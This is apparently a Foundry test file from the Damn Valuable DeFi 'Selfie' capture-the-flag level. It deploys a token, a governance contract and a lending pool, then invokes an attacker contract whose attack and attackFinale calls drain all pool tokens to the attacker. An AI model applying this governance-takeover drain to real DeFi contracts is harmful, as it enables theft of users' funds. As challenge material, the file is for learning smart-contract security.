// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
import {HackReceiver} from "../../../src/Contracts/selfie/hackReceiver.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        vm.prank(attacker);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");

        vm.stopPrank();
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         *
         */
        console.log(unicode"the address of attacker is %s", attacker);
        console.log(unicode"🤖 Starting the exploit... 🤖");
        vm.prank(attacker);
        HackReceiver hackReceiver = new HackReceiver(
            address(selfiePool),
            address(simpleGovernance),
            address(dvtSnapshot)
        );
        hackReceiver.attack(TOKENS_IN_POOL - 100000);
        vm.warp(180000);
        hackReceiver.attackFinale();

        console.log(unicode"🤖 Exploit complete. 🤖");
        console.log(unicode"The balance of the attacker is: ", dvtSnapshot.balanceOf(attacker));

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
        vm.stopPrank();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
